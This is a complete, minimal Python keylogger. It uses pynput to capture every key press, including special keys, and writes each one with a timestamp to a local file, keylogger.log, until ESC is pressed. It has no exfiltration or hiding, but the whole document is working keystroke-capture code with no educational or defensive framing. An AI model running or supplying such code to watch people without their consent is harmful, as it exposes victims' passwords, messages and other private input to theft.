from pynput import keyboard
import logging

# Configure logging
logging.basicConfig(filename="keylogger.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        # Log the key pressed
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # For special keys
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop listener by pressing the ESC key
    if key == keyboard.Key.esc:
        return False

def main():
    # Set up the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()

